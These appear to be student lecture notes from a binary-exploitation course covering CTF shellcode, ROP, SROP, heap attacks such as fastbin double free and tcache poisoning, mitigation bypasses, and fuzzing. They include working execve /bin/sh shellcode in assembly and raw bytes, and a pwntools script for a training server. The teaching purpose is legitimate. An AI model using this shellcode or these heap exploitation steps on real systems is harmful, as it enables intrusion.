# Lecture Notes

### Introductory lesson: how to approach challenges (backtoshell notes)

```c
void main(void) {
  code *UNRECOVERED_JUMPTABLE;
  
  UNRECOVERED_JUMPTABLE = (code *)mmap((void *)0x0,0x1000,7,0x22,-1,0);
  read(0,UNRECOVERED_JUMPTABLE,0x200);
                    /* WARNING: Could not recover jumptable at 0x00401144. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*UNRECOVERED_JUMPTABLE)(0,0,0,0,0,0);
  return;
}
```

`UNRECOVERED_JUMPTABLE` = the compiler is guessing the presence of a jump table, but its not. Its just a buffer.

**mmap**

`mmap` = linux func that allocates memory regions

If the mmap address is zero, the address will be randomized. The other parameters says where to find the size of the data that will be allocated, and its permissions. The fd is used to load a file into memory. in mmap 7 means rwx.

**read**

`read` = linux syscall that reads bytes from file descriptors (for e.g. 0 is the fd of the stdin). Example:

`read(0, UNRECOVERED_JUMPTABLE, 0x200)` reads from zero into the jump table for 0x200 bytes. Note that this info is obtainable trough the `man` command.

**binary behaviour**

`(*memory)(0,0,0,0,0,0)` means: jump to memory. It means that the first six registers contain zeros.

backtoshell is creating a page in memory from an executable, and jumping in it.

How do we exploit backtoshell to read the flag? **We need to run shellcode**.

**syscall**

`syscall` = way that programs use to interact with the kernel, in order for e.g. to r/w a file, send packets, use hw, etc. To execute syscalls, some registers get set up and the syscall is ran. The kernel knows which syscalls is going to be executed by the `rax` register content (for e.g. read has number `0x00`).

**execve**

![image-20210914145615236](.assets/image-20210914145615236.png)

To open a shell, we need the `execve` syscall, which has to be executed with `/bin/sh` as first parameter. In order to do that we will put `0x3b` in the `rax` register, and a pointer to `/bin/sh\x00` into `rdi`.

Note that the string terminator is very important in order to make the exploit work.

**useful links**

* [Ghidra cheatsheet](https://ghidra-sre.org/CheatSheet.html)
* [Online assembler, to write shellcode](https://defuse.ca/online-x86-assembler.htm)
* [syscall specifications](https://syscalls.w3challs.com/?arch=x86_64)
* [x86 registers guide](https://wiki.cdot.senecacollege.ca/wiki/X86_64_Register_and_Instruction_Quick_Start)
* [x86-64 instruction set](https://www.felixcloutier.com/x86/)
* [GDB cheatsheet](https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf)
* [Polymorphic and smaller versions of three shell-storm’s x64 shellcodes, including the smallest execve /bin/sh – Pentester's life (pentesterslife.blog)](https://pentesterslife.blog/2018/01/13/polymorphic-and-smaller-versions-of-three-shell-storms-x64-shellcodes-including-the-smallest-execve-bin-sh/)
* [shell-storm | Shellcodes Database](http://shell-storm.org/shellcode/)

**how does the exploit work**

First we need to get the string /bin/sh into memory, since we need to put its address in the `rdi` register. For e.g. we can do this by pushing it on the stack, using the `push` assembly function. First, we need to encode the string in hex using python:

```python
import binascii
binascii.hexlify(b"/bin/sh\x00")
```

output: `b'2f62696e2f736800'`. It's too long to be pushed on the stack with a single push function, and we need it to be reversed since we are working with a little endian processor. In python this is done using `[::-1]`, so we will use `binascii.hexlify(b"/bin/sh\x00"[::-1])`. So first we load it into a register, and then we push the reg into mem:

```assembly
mov rbx, 0x0068732f6e69622f
push rbx
```

Now the string is in the top of the stack. Then we will use the ESP address to reference it to the execve function.

So to solve backtoshell:

```assembly
mov rbx, rax                ; rbx is used as a general purpose register
                            ; to put things on the stack
add rbx, 64
mov rsp, rbx
mov rbx, 0x0068732f6e69622f ; '/bin/sh' is put into a register
push rbx                    ; argument on the stack
mov rdi, rsp                ; we copy the pointer to the argument in rdi as required
xor rbx, rbx                ; we put zero into reg b
push rbx                    ; we push it on the stack
mov rsi, rsp                ; we put the pointer to zero into the rsi reg
mov rdx, rsp                ; and we do the same for rdx (as required by the syscall)
mov rax, 0x3b               ; we choose which syscall to execute (execve)
syscall                     ; we call the function
```

Note that since the code of the binary sets rsp to zero, when the program jumps to our shellcode and we push things on the stack, the execution fails. We first need to move the stack in the middle of the memory page allocated with memmap, which is done in the first three lines of the shellcode, and then we can execute our shellcode.

Which will output our shellcode:

    \x48\x89\xC3\x48\x83\xC3\x40\x48\x89\xDC\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xE2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05

**Note (zeros)** that zeros in the exploits needs to be avoided is the input is read with a scanf function.

**Note (char array as sycall argument)** that we need to put a pointer to a zero to terminate the array of arguments of the execv function, which means that we need to put a pointer to a zero in the `rsi` register (since the function writes those registers in this order: `rax`, `rdi`, `rsi`).

**Note (rax register)** - the `rax` register is usually used for function return values.

**Note** - remember to use `objdump`

**Note** - general purpose shellcode to spawn a shell:

```
"\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xE2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"
```

After flagging we can get the source code of the binary from the server:

```c
int main() {
    void *data;
    data = mmap(0, 0x1000, 7, 0x22, -1, 0);
    read(0, data, 0x200);
    register long rax __asm__("rax") = data;
    reset_register();
    asm("jmp %rax");
    return 0;
}

int _start() {
    main();
    exit(0);
}
```

### Debugging environment setup

1. socat is used to redirect stdin/stdout to a socket. After launching it:
   
   ```sh
   socat TCP-LISTEN:4000,reuseaddr,fork EXEC:"./<BINARY>"
   ```
   
2. We can `ncat` to the binary of the challenge:
   
   ```shell
   ncat training.jinblack.it <PORT>
   ```
   
   Or in alternative we can use pwntools:
   
   ```assembly
   from pwn import *
   
   SC = <SHELLCODE>
   PORT = <PORT>
   r = remote("127.0.0.1", PORT)
   
   input("press any key to continue")    # we stop in order to be able
                                       # to attach gdb to the process
   r.send(SC)
   r.interactive()
   ```
   
3. Then we can attach gdb to the binary. First we use `ps` to find the `pid` of the binary, and then we can do:
   
   ```sh
   gdb attach <BINARY_PID>
   ```

**Even easier setup with pwntools:**

```assembly
from pwn import *

SC = <SHELLCODE>

context.terminal = [ 'tmux', 'splitw', '-h']
p = process("./<BINARY>")

gdb.attach(p, '''
    # b * 0x004000b0
''')                                # start gdb with breakpoint already setted
input("press any key to continue")    # we stop in order to be able
                                    # to attach gdb to the process
p.send(SC)
p.interactive()
```

**Note (custom breakpoint)** - Sw breakpoint achieved trough the `int3` instruction, which is a single byte instruction (`0xcc`). This case be also used by us: if we put it inside the shellcode, we can get a free breakpoint.

### Reverse shell

Note - if we get a forking server, which means that there's a connection to the binary which is handled by a new `fd` (not `stdin` or `stdout`). In that case when we execute the shell, it still works with `stdin` and `stdout`, which means that if we type something, nothing will be printed. Solution: `dup2`, which duplicates the connection `fd` to the `stdin` and `stdout`.

If for some other reason i/o is not available, we need a reverse shell, which means executing some code that connects to a server and spawns a shell. This is achieved in this order:

1. `socket()`
2. `dup2()`
3. `connect()`
4. `exec()`

### Binary Mitigations

1. **Stack canary**
   
   Countermeasures:
   
   * Overwriting the check fail function, make the canary fail in order to jump to that function, and put arbitrary code in place of the function.
   * Use an address to jump over the canary.
   * **Leak it**

2. **ASLR**
   
   Stack, libraries and heap randomized. In previous challenges our exploits would not work if address space was randomized. Note that only whole memory pages are randomized, not every variable, that's because the code is harder to randomize because relative addressing would broke. Note that:
   
   * `.text` section is not always randomized. Since pages are contiguous, leaking `.bss` means leaking also `.text` and`.got`.
   * Randomization works per page in linux (4kb size). This means that leaking an address means knowing all addresses of that page.

   <u>Usually with ASLR we need to find some way to leak an address belonging to `libc` in order to be able to carry some exploit.</u>
   
3. **PIE**: Randomized `.text` section
   
4. **NX**: if a page is marked as non executable, instructions present there will not be executed

5. **RELocation Read Only**

### Linking

A **statically linked** executable does not need external symbols to work, since the binary contains the library itself. This means that static linking generates large executables, hence it is not a common practice.

On the contrary in a **dynamically linked** executable, an address to the files being linked to the binary is included into the binary itself. To check external symbols linked to this type of binary `objdump -TC` can be used.

To resolve symbols at runtime, ELF files have two auxiliary tables:

1. **GOT** table - like a cache, one entry per symbol holding a real address or value if address not yet resolved
2. **PLT** table - still one entry per symbol, but this time it contains a small set of instructions to correctly load the given symbol.

Relocation Read-Only (or **RELRO**) is a security measure which makes some binary sections read-only.

Other than NX and ASLR we have another complication flag which can make things more difficult: Relocation Read Only. There are two RELRO "modes": partial and full.

### RELRO

**Partial RELRO**

Partial RELRO is the default setting in GCC, and nearly all binaries you will see have at least partial RELRO.

From an attackers point-of-view, partial RELRO makes almost no difference, other than it forces the GOT to come before the BSS in memory, eliminating the risk of a [buffer overflows](https://ctf101.org/binary-exploitation/buffer-overflow) on a global variable overwriting GOT entries.

**Full RELRO**

Full RELRO makes the entire GOT read-only which removes the ability to perform a "GOT overwrite" attack, where the GOT address of a function is overwritten with the location of another function or a ROP gadget an attacker wants to run.

Full RELRO is not a default compiler setting as it can greatly increase program startup time since all symbols must be resolved before the program is started. In large programs with thousands of symbols that need to be linked, this could cause a noticable delay in startup time.

**What does RELRO mean?**

Unless a program is marked [full RELRO](https://ctf101.org/binary-exploitation/relocation-read-only), the resolution of function to address in dynamic library is done lazily. All dynamic libraries are loaded into memory along with the main program at launch, however functions are not mapped to their actual code until they're first called. For example, in the following C snippet `puts` won't be resolved to an address in libc until after it has been called once:

```c
int main() {
    puts("Hi there!");
    puts("Ok bye now.");
    return 0;
}    
```

To avoid searching through shared libraries each time a function is called, the result of the lookup is saved into the GOT so future function calls "short circuit" straight to their implementation bypassing the dynamic resolver.

This has two important implications:

1. The GOT contains pointers to libraries which move around due to [ASLR](https://ctf101.org/binary-exploitation/address-space-layout-randomization)
2. The GOT is writable

These two facts will become very useful to use in [Return Oriented Programming](https://ctf101.org/binary-exploitation/return-oriented-programming).

### ROP

**x86 ROP exploit**

`read` call example, stack layout:

| ...                       |
| ------------------------- |
| sEBP / junk               |
| sEIP / pointer to read    |
| argument / cleaner        |
| argument / 0              |
| argument / pointer to buf |
| argument / 100            |
| pointer to system         |
| ...                       |

the cleaner is a gadget such as `pop rdi; ret`. Note that the cleaner needs to pop at least the size of the arguments. For e.g. if we have three arguments, the cleaner needs to move at least three cells.

**x64 ROP exploit**

Different calling convention: paramenters inside registers.

Stack layout:

| ...                  |
| -------------------- |
| sEBP / junk          |
| sEIP / pop args      |
| arg / 0              |
| arg / pointer to buf |
| arg / 100            |
| pointer to read      |
| pop args             |
| pointer to buf       |
| pointer to system    |
| ...                  |

**Magic gadget**

If we jump there, magically a shell spawns? -> `one_gadget`. It works depending on whatever value is inside the registers:

* `RAX` must be null
* `RAX+0x30` must also be null

### SROP

It exploits the `SIGRETURN` syscall that takes a stack frame and uses it to restore the program execution. When getting an interrupt from this signal the kernel takes this stack and restores program execution. This means that all registers are there. We can do a `SIGRETURN` syscall and abuse this to control all the registers and the instruction pointer. It is also always in memory.

### The heap

heap: region of memory above `.bss` and `.data`. It grows towards high addresses.

The most popular way to allocate memory in the heap is the `malloc()` function (and its variants, like `ptmalloc`), which returns a pointer to the address of the memory that has been allocated (called buffer). Note that memory in the heap can be manipulated also trough syscalls: `mmap` allocated memory, while `munmap` deallocates it; `brk/sbrk` changes location of allocated chunks of memory.

#### Chunks

The buffer is part of a structure called chunk:

```
    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                     |A|M|P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             User data starts here...                          .
            .                                                               .
            .             (malloc_usable_size() bytes)                      .
            .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             (size of chunk, but used for application data)    |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|1|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

* `PREV_INUSE` (P) – This bit is set when previous chunk is allocated.
* `IS_MMAPPED` (M) – This bit is set  when chunk is mmap’d. If the malloc asks for a lot of memory, the chunk gets mapped.
* `NON_MAIN_ARENA` (N) – This bit  is set when this chunk belongs to a thread arena (it belongs to another chunk ?).

**Note**: the size of the chunk must be a multiple of 16.

**the top chunk**

Special chunk that occupies all the available  memory space in the heap. Every time a malloc is called it might be  shrinked. Once there’s no more space on the heap, a `brk(void *)` is called to allocate more pages to  the heap and the top chunk is expanded.

**in practice**

```c
#include <stdlib.h>
#include <stdio.h>
int main(int argc, char const *argv[]) { 
    char *buffer_1;
    char *buffer_2;
    char *buffer_3; 
    buffer_1 = (char*) malloc(0x20);
    buffer_2 = (char*) malloc(0x20);
    buffer_3 = (char*) malloc(0x28); 
    return 0; 
}
```

after a `b main` in gdb:

![image-20211019171201023](.assets/image-20211019171201023.png)

We can see that there is no heap allocated. After getting to the instruction that allocated the first buffer:

![image-20211019171241385](.assets/image-20211019171241385.png)

We have it. To inspect its content:

```
pwngdb> x/32gx    0x555555756260-8
```

![image-20211019171816810](.assets/image-20211019171816810.png)

As we can see in the first 16 bytes we get the size of the allocated chunk. the `0x20d81` is the size of the top chunk, which begins at `0x555555756288`.

#### Memory deallocation

`void free(void* ptr)` is the most known deallocation primitive. It requires a pointer to a memory buffer previously allocated with a function for memory allocation (e.g.  malloc).

Freed chunks could be consolidated with other freed  chunks (also with the top chunks); if not they are inserted in lists called bins.

#### Bins

they are lists of free chunks of a specific size. Heads of the lists are located in the `.bss` of the libc. There are 4 types of beans:

1. fast bins (8 linked lists)
2. unsorted bins (1 doubled linked list)
3. small bins (62 double linked lists)
4. large bins (62 double linked lists)

**unsorted bins**

 Any freed chunk with size >= `0xA0` (160) ends up in the unsorted bin.

When a chunk in the unsorted bin is not able to satisfy a  malloc request (e.g., `malloc(0x200)` but the freed chunk  has size `0x100`), the chunk in the unsorted bin is moved to the proper small or large bin: they work like a middle ground between small and large bins.

**linked lists in c**

From [Linked lists - Learn C - Free Interactive C Tutorial (learn-c.org)](https://www.learn-c.org/en/Linked_lists):

> A linked list is a set of dynamically allocated nodes, arranged in such a way that each node contains one value and one pointer. The pointer always points to the next member of the list. If the pointer is NULL, then it is the last node in the list.
> 
> A linked list is held using a local pointer variable which points to the first item of the list. If that pointer is also NULL, then the list is considered to be empty.
> 
> ```
>     ------------------------------              ------------------------------
> |              |             |            \ |              |             |
> |     DATA     |     NEXT    |--------------|     DATA     |     NEXT    |
> |              |             |            / |              |             |
> ------------------------------              ------------------------------
> ```

And from [Linked List | Set 1 (Introduction) - GeeksforGeeks](https://www.geeksforgeeks.org/linked-list-set-1-introduction/):

> ```c
> // A linked list node
> struct Node {
> int data;
> struct Node* next;
> };
> ```

**fast bins**

They are optimized bins for tiny freed chunks, not used for heavy operations.

* `0x20` to `0x90` bytes.
* <512 bytes
* top-chunk

From [Heap Exploitation - Nightmare (guyinatuxedo.github.io)](https://guyinatuxedo.github.io/25-heap/index.html):

> The fast bin consists of 7 linked lists, which are typically referred to by their `idx`. On `x64` the sizes range from `0x20` - `0x80` by default. Each idx (which is an index to the fastbins specifying a linked list of the fast bin) is separated by size. So a chunk of size `0x20-0x2f` would fit into `idx` `0`, a chunk of size `0x30-0x3f` would fit into `idx` `1`, and so on and so forth.
> 
> ```
> ────────────────────── Fastbins for arena 0x7ffff7dd1b20 ──────────────────────
> Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE)
> Fastbins[idx=1, size=0x20]  ←  Chunk(addr=0x602050, size=0x30, flags=PREV_INUSE)
> Fastbins[idx=2, size=0x30]  ←  Chunk(addr=0x602080, size=0x40, flags=PREV_INUSE)
> Fastbins[idx=3, size=0x40]  ←  Chunk(addr=0x6020c0, size=0x50, flags=PREV_INUSE)
> Fastbins[idx=4, size=0x50]  ←  Chunk(addr=0x602110, size=0x60, flags=PREV_INUSE)
> Fastbins[idx=5, size=0x60]  ←  Chunk(addr=0x602170, size=0x70, flags=PREV_INUSE)
> Fastbins[idx=6, size=0x70]  ←  Chunk(addr=0x6021e0, size=0x80, flags=PREV_INUSE)
> ```
> 
> Not the actual structure of a fastbin is a linked list, where it points to the next chunk in the list (granted it points to the heap header of the next chunk):
> 
> ```
> gef➤  x/g 0x602010
> 0x602010: 0x602020
> gef➤  x/4g 0x602020
> 0x602020: 0x0 0x21
> 0x602030: 0x0 0x0
> ```

<img src=".assets/image-20211019172646768.png" alt="image-20211019172646768" style="zoom:67%;" />

The first element of the list containts all bins 16 bytes long, the second all elements 32 bytes long, and so on. As for the previous code example, assuming that we added three free to the end of the code, we would have:

1. before `free(0xCCD0) ` deallocation:
   
   <img src=".assets/image-20211019172753017.png" alt="image-20211019172753017" style="zoom:67%;" />

2. after `free(0xCCD0) ` deallocation:
   
   <img src=".assets/image-20211019172853692.png" alt="image-20211019172853692" style="zoom:67%;" />

And after `free(0xBBC0)`:

<img src=".assets/image-20211019181217613.png" alt="image-20211019181217613" style="zoom: 80%;" />

#### `__malloc_hook`

> The GNU C Library lets you modify the behavior of `malloc`, `realloc`, and `free` by specifying appropriate hook functions. You can use these hooks to help you debug programs that use dynamic memory allocation, for example.

<img src=".assets/image-20211019173554280.png" alt="image-20211019173554280" style="zoom:80%;" />

After the first malloc we get a pointer to the address of the top chunk:

```
0x7ffff7dcdca0 <main_arena+96>: 0x0000555555756280      0x0000000000000000
```

After the first free the head of the bin points to the first free chunk. After another free we get the same behavior from the second chunk, and so on:

<img src=".assets/image-20211019173943823.png" alt="image-20211019173943823" style="zoom: 67%;" />

**What are we trying to achieve with heap manipulation?**

The final goal of this kind of attack is to overwrite `__malloc_hook` or `_free_hook`. Those are pointers to monitor the allocation. If we put a function inside those variables, the functions putted there gets executed instead of `free` and `malloc`. This basically is code execution. Since the parameter of the `__free_hook` is the same of the `free()`, if we put `/bin/sh` in a chunk, and we put `system()` into `__free_hook`, we will have a shell.

Basically we will overflow heap buffers like conventional stack buffers. More specifically we can overflow:

* Metadata and content of the next chunks (in memory)
* Top chunk (House of force)
* Potential leaks if the buffer is not `memset` to 0  (`calloc` solves this problem)

If deallocation is not executed correctly:

* Leakage of the bins’ pointers
* Corruption of the bins’ pointers
* Multiple pointers to the same chunk in memory 
* Double free (Fastbin attack)

#### fastbin attack

**how does it work**

> **The goal of this attack is to overwrite the data of a fast bin to trick `malloc()` into returning a nearly-arbitrary pointer. It does not allow to gain code execution, but it allows to control data allocated with malloc and to allocate arbitrary chunks in memory.**

Basically its mechanism consists in deallocating twice the same chunk, which is possible if a vulnerable piece of code won't check if a chunk is actually allocated or not before deallocating it.

**In detail**

We know that the fast bins list is a LIFO double linked list, with new items inserted at the top of it. Suppose that we have two chunks allocated, A and B, both have the same size which is not very big (`0x40` for example). The attack works by executing the following steps in this exact same order:

1. `free(B)`, `free(A)` (in this order). Now both chunks became fast bins, and we have the following setup:
   
   ```
   head -> A -> B -> null
   ```

2. `free(B)`: its pointers will remain the same but in addition B will point to it, since the system does not check automatically for mismanagement of the heap and it will be tricked into treating A like it was still allocated. This should be a task done by the software developer, which is why this vulnerability is still a problem in many systems. Now the situation is the following:
   
   ```
   head -> B -> (A -> B ->)*
   ```
   
   We have a loop.

3. `malloc(0x40)`: it returns the address of B. Now the head points to A and B is allocated, but the loop is still there.

4. `malloc(0x40)`: it return the address of A, the head of the fast bins points again to B. Same deal as before. Setup:
   
   ```
   head -> B -> (A -> B ->)*
   ```

5. Now both A and B are allocated and we can write in it. Suppose we write `0x41414141` in B. It will overwrite the address of A into B, leading to it pointing to `0x41414141`:
   
   ```
   head -> B -> 0x41414141
   ```

6. If now we do another malloc, the area of memory allocated will be the chunk pointed by B. Which is the area of memory pointed by the address we just overwrited: **it means that a `malloc(0x40)` will allow us to write arbitrary content into the `0x41414141` memory address.**

We can stop the chain by deciding what will be the next chunk returned by the next `malloc`. Constraints that need to be respected to achieve the wanted result:

- The memory is mapped (otherwise `SEGFAULT`).
- The size of the fake chunk matches with the bin size.

Note that he first 4 bits of the size are not considered. There are no requirements on the alignment of the chunk.

#### null byte poisoning attack

Single byte overflow which can make two chunks overlap (`prev_size` != `chunksize`):

```c
char *buf = malloc(128);
int read_length = read(0, buf, 128);
buf[read_length] = 0;
```

**Goal of the attack**: manipulate chunk data. The entity of this attack depends on what's on the heap.Usually function pointers or addresses to which we can read or write are targeted, to respectively execute arbitrary code, or to build arbitrary read/writes.

We need 3 chunks:

1. Chunk A, from which we start the overflow
2. Chunk B, where overlay will happen
3. Chunk C, to trigger the exploit

> The goal of this attack is to make 'malloc' return a chunk that overlaps with an already allocated chunk, currently in use. First 3 consecutive chunks in memory (`a`, `b`, `c`) are allocated and the middle one is freed. The first chunk is overflowed, resulting in an overwrite of the 'size' of the middle chunk. The least significant byte to 0 by the attacker. This 'shrinks' the chunk in size. Next, two small chunks (`b1` and `b2`) are allocated out of the middle free chunk. The third chunk's `prev_size` does not get updated as `b` + `b->size` no longer points to `c`. It, in fact, points to a memory region 'before' `c`. Then, `b1` along with the `c` is freed. `c` still assumes `b` to be free (since `prev_size` didn't get updated and hence `c` - `c->prev_size` still points to `b`) and consolidates itself with `b`. This results in a big free chunk starting from `b` and overlapping with `b2`. A new malloc returns this big chunk, thereby completing the attack.
> 
> Source: [Shrinking Free Chunks - heap-exploitation (dhavalkapil.com)](https://heap-exploitation.dhavalkapil.com/attacks/shrinking_free_chunks)

<img src=".assets/image-20211022180356586.png" alt="image-20211022180356586" style="zoom: 50%;" />

Steps:

1. free(B) -> that space gets into the unsorted bin list;
2. overflow into B;
3. allocate two chunks into the space once taken up by B: B1 and B2;
4. free(B1). Since we changed the size, B2 won't overflow into C (`0x200` < `0x208`);
5. free(C). Since there is the empty B1 and a small margin after B2, the system will consolidate all of its space.

End result: the next chunk allocation will overlap with B2.

##### More details on how it works

> > **How is arbitrary code execution achieved?**
> 
> Arbitrary code execution is achieved when a single null byte overwrites the chunk header of next chunk (‘p3’). When a chunk of size 1020 bytes (‘p2’) gets overflown by a single byte, next chunk (‘p3’) header’s size’s least significant byte gets overwritten with NULL byte and not prev_size’s least significant byte (LSB = least significant byte)
> 
> > **Why LSB of size gets overwritten instead of prev_size’s LSB?**
> 
> [checked_request2size](https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1254) converts user requested size into usable size (internal representation size) since some extra space is needed for storing malloc_chunk and also for alignment purposes. Conversion takes place in such a way that last 3 bits of usable size is never set and hence its used for storing flag informations P, M and N.
> 
> Thus when malloc(1020) gets executed in our vulnerable code, user request size of 1020 bytes gets converted to ((1020 + 4 + 7) & ~7) 1024 bytes (internal representation size) . Overhead for an allocated chunk of 1020 bytes is only 4 bytes!! But for an allocated chunk we need chunk header of size 8 bytes, inorder to store prev_size and size informations. Thus first 8 bytes of the1024 byte chunk will be used for chunk header, but now we are left with only 1016 (1024-8) bytes for user data instead of 1020 bytes. But as said above in prev_size definition, if previous chunk (‘p2’) is allocated, chunk’s (‘p3’) prev_size field contains user data. Thus prev_size of the chunk (‘p3’) located next to this allocated 1024 byte chunk (‘p2’) contains the remaining 4 bytes of user data!! This is the reason why LSB of size gets overwritten with single NULL byte instead of prev_size!!
> 
> Source: [Off-By-One Vulnerability (Heap Based) – sploitF-U-N (wordpress.com)](https://sploitfun.wordpress.com/2015/06/09/off-by-one-vulnerability-heap-based/)

##### Mitigation bypass

This is how this bug was patched:

```c
if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))
 malloc_printerr ("corrupted size vs. prev_size");

/* Size of the chunk below P. Only valid if !prev_inuse (P). */
#define prev_size(p) ((p)->mchunk_prev_size)

/* Ptr to next physical malloc_chunk. */
#define next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))
```

Basically a check between the size of the newly allocated chunks and their previous size is implemented. Given a chunk P, its previous size is recovered by taking it from the next chunk, which is just the address of P plus its size. 

To bypass this, we can put a fake `prev_size` at the beginning of B, and align 8 bytes later the real `prev_size`:<img src="theory.assets/Schermata 2021-11-27 alle 18.02.35.png" alt="Schermata 2021-11-27 alle 18.02.35" style="zoom:67%;" />

#### T-Cache

It is a cache for chunk size < `0x500`. It is a LIFO single linked list which holds free chunks before going trough the bin sorting process. It is a relevant attack surface for heap manipulation.

When we free something we get a pointer to the bin. Note that the pointer is to the actual data, not to the metadata like for fast bins. When a chunk gets freed it ends up at the top of the list.

**Note**: if I have more than 7 chunks per bin the next one we free will go into the T-Cache.

**Note:** It can be useful to check the source code of the `malloc` function to check for libc version specific code. For example, here's a [link to the source code of the function in the 2.27 libc]([malloc.c - malloc/malloc.c - Glibc source code (glibc-2.27) - Bootlin](https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c)).

##### Tcache poison attack

Idea: overwrite the pointer of the chunk inside t-cache. Then if we keep allocating the memory region of this arbitrary value will be make writable by the next `malloc`, and it can be overwritten in any way we want.

**Note**: there is no check on the size like we have for the regular bins.

**T-Cache Key**: similar to canary. It is a random value that gets putted inside a chunk inside the T-Cache. If when freeing the value is not there, some extra checks are applied.

**Pointer protection**: ??. It complicates T-Cache exploits by needing to leak the address of the heap.

**Note**: to check the code of a specific libc version we can use [Linux source code (v5.14.14) - Bootlin](https://elixir.bootlin.com/linux/latest/source).

### Static analysis

Means understanding the functionality of a binary by looking at the code:

* disassembly
* recover function
* recover types
* decompile
* ...

**Note**: in assembly the types vary only basing on the size of variables and how we interpret that sequence of bytes.

#### Disassembler

**Linear sweep disassembler**

Starting from the bytes we obtain the opcodes, then the arguments gets fetched, and then we jump to the next assembly instruction.

Example: `objdump`.

**Problem**: we are forcing an interpretation done in a certain way on a sequence of bytes. This means that the same sequence of bytes vary on the interpretation. Consequence: it's very easy to mess with static analysis to obfuscate the code. Just adding some bytes changes completely the interpretation of the code we are reading (**disalignment**). This problem is even worse considering that in x86, instructions have variable length.

**Recursive disassembler**

Different approach: it tries to follow the control flow of the program to improve the meaning of the disassembled code.

**Problem**: it can be tricked into doing nonsense (for e.g. following infinite loops).

**capstone**

library that can be used to create a custom decompiler. It is linear sweep and it can be called by any programming language, to for e.g. build instructions or to disassemble at runtime. For example if we have a specific constraint on a instruction we can build it easily in python with capstone.

#### Decompiler

Most important thing: make the code readable. Since the decompiler is guessing a lot of stuff, refactoring the code is crucial. Best way to do that: matching the correct types to optimize the code.

### Dynamic analysis

Best tool ever: **gdb**.

* **hardware breakpoints**: address set in the cpu which stops it when executed. The memory is not changed by doing that, and it is limited by the hardware. In standard laptop cpus we have at most 4 of them. 
* **watchpoints**: like breakpoints, but for memory. They breaks when accessing some specific address in memory, either in read or in write.
* **sycall/signal breakpoints**
* **scriptable**: if a debugger is scriptable, also the execution is scriptable.

**Note**: `set $$reg = val` does exactly what it looks like. Same for `call address`.

**gdb automation**

Basic concept behind it: **avoiding mistakes**.

**`commands`, run arbitrary (gdb) instructions after a breakpoint**

```
commands br_num
    command_list
end
```

### Fuzzing, Symbolic execution

**Idea**: it is possible to find vulnerabilities in a automated way. A first approach can be to find some input that can make the program crash. If the program crashes, we may have a lead. How do we fund such input?

* **Fuzzing**
  
  Consists in creating tons of random data very fast.

* **Symbolic execution**
  
  Slowly generate stuff that can make the program crash by reasoning on the execution of the binary.

Most efficient technique? Fuzzing.

#### Fuzzing

First, we need a way to mesure progress (how do I know which random input is better?). For example, we can check how many control blocks we have visited. Another way could be to measure the connections between basic blocks (edges). For example in a loop, if we go trough it only once we cover all basic blocks, but we execute it only one time. By looking at edges, we can measure also loop progress.

##### Fuzzing in practice

How to do that? We can use a compiler that adds code for each jump. **This means that we need the source code of the program**. Another way to achieve that without the source code is using an emulator like QEMU to check for the things we just listed. Last approach: LLVM, it exploits the intermediate representation and it can execute without source code.

##### Fuzzing mutations

As for the input, we start from some random data, and then we introduce mutations to check for progress. Problem: How much mutation do we want? Too low and we do not have enough coverage, too much and we have high probability of failing immediately. Example on mutations: bit flips, simple arithmetics, known integers, **havoc**, **splice**, etc.

##### Speed is important

Problem: tons of input to test. Solution: shorten fuzzing execution time.

1. **Forking server**: Duplication of the program achieved by code injection. It consists in doing a `fork` for each text input that we have.

2. **Deferred instrumentation**:
   
   > Initialize the forkserver a bit later, once most of the initialization work is already done, but before the binary attempts to read the fuzzed input and parse it; in some cases, this can offer a 10x+ performance gain. You can implement delayed initialization in LLVM mode in a fairly simple way.

3. **Persistent mode**: execute the program each time we want to test a new input

4. **Dictionary**: Put known words that crashes a lot of code in the fuzzer

5. Libraries used to help find vulnerabilities, called **address/memory sanitizers**. They can add a guard between allocation in memory instead of having the heap handled by the libc, for e.g. we can have custom heaps that puts buffer between chunks to test for bugs.

##### Reducing the complexity of randomized input

1. **Testcase minimization**: splitting the input in chunks to narrow down spots in logarithmic steps.
2. **Corpus minimization**: trying to remove testcases that trigger the same vulnerability

#### Symbolic execution example

Problem with this: it is slow and it is exponential in weight on the system. **Best approach**: hybrid approach between fuzzing and symbolic execution.

**Note**: It is of vital importance to minimize **path explosion**. We need to exclude complex functions and to narrow the simulated scenarios as much as we can.

#### Reverse Engineering challenges

We need to find the flag in the memory of the program. Obtained by concretizing the input basing on the constraints given by the program execution.

> In short, "constraint programming" means we do not specify a step or sequence of steps to execute, but rather the properties of a  solution to be found.
> 
> This technique is very useful in reverse-engineering: specific sets of  constraints often need to be satisfied in order to "crack" a program.

Example: reverse engineering of a random number generator.

#### SMT Solvers

